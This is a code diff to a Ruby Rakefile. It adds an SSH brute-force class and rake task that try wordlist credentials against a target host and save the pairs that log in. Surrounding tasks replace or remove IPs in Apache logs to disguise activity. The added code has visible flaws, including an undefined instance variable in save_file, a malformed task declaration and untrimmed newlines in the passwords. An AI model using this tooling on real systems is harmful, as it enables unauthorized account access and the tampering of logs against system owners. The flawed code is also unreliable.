@@ -104,6 +104,34 @@ class Apache2
     cleanup
     end
 end
+class Brute
+  def initialize(host: "", word_list: "brute.txt", found_file: "found.txt")
+    @word_list  = word_list
+    @host       = host
+    @found_file = found_file
+  end
+  def run
+    File.open(@word_list, "r").each_line do |l|
+      if ssh(l)
+        puts "logged in"
+        save_file(l)
+      end
+    end
+  end
+  def ssh(l)
+    begin
+      Net::SSH.start(@host, l.split(":")[0], :password => l.split(":")[1], :timeout => 10, :port => 33, :number_of_password_prompts => 0) do |ssh|
+        puts ssh.exec!("hostname")
+        return true
+      end
+    rescue Net::SSH::AuthenticationFailed
+      return false
+    end
+  end
+  def save_file(l)
+    File.open(@found, "a") {|f| f.write(l + "\n") }
+  end
+end
 def ssh_tunnel_forward(ssh, args)
   require 'net/ssh'
   c      = Config.new(ssh: ssh)
@@ -181,8 +209,12 @@ task :rmip, [:ip] do |t, args|
 end
 desc "Replace IPs in apache2 logs with a fake IP."
 task :replaceip, [:ip] do |t, args|
-  # https://github.com/Michael-Meade/LogGhost/blob/main/message.rb
   a = Apache2.new(rip: args.ip ).replace
+end
+desc "SSH brute force"
+task :sshbrute [:ip, :found_file, :wl] do |t, args|
+  args.with_defaults(:found_file => "found.txt", :wl => "brute.txt")
+  b = Brute.new(host: args.ip, word_list: args.wl, found_file: args.found_file).run
 end
 options = {}
 OptionParser.new do |parser|
